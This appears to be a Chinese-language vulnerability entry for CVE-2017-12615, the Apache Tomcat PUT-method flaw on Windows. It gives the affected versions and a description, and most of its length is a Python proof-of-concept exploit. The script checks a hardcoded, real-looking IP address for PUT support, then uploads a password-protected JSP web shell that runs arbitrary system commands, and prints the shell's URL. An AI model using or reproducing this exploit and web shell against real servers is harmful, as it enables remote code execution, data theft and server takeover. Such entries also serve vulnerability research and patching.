# CVE-2017-12615  #
## 受影响版本 ##
Apache Tomcat 7.0.0 - 7.0.81
## 平台 ##
windows 、linux等多平台
## 测试系统 ##
windows
## 类型 ##
远程
## 描述 ##
当 Tomcat运行在Windows操作系统时，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限
## POC ##
<pre class="prettyprit lang-javascript">
import httplib  
import sys  
import time  
body = &#x27;&#x27;&#x27;&#x27;&#x27;&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp 
+&quot;\\n&quot;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;))){out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);}else{out.println(&quot;:-)&quot;);}%&gt;&#x27;&#x27;&#x27;  
try:  
    conn = httplib.HTTPConnection(&#x27;218.203.123.79&#x27;)  
    conn.request(method=&#x27;OPTIONS&#x27;, url=&#x27;/ffffzz&#x27;)  
    headers = dict(conn.getresponse().getheaders())  
    if &#x27;allow&#x27; in headers and headers[&#x27;allow&#x27;].find(&#x27;PUT&#x27;) &gt; 0 :  
        conn.close()  
        conn = httplib.HTTPConnection(&#x27;218.203.123.79&#x27;)  
        url = &quot;/&quot; + str(int(time.time()))+&#x27;.jsp/&#x27;  
        #url = &quot;/&quot; + str(int(time.time()))+&#x27;.jsp::$DATA&#x27;  
        conn.request( method=&#x27;PUT&#x27;, url= url, body=body)  
        res = conn.getresponse()  
        if res.status  == 201 :  
            #print &#x27;shell:&#x27;, &#x27;http://&#x27; + sys.argv[1] + url[:-7]  
            print &#x27;shell:&#x27;, &#x27;http://218.203.123.79&#x27; + url[:-1]  
        elif res.status == 204 :  
            print &#x27;file exists&#x27;  
        else:  
            print &#x27;error&#x27;  
        conn.close()  
    else:  
        print &#x27;Server not vulnerable&#x27;  
          
except Exception,e:  
    print &#x27;Error:&#x27;, e  
</pre>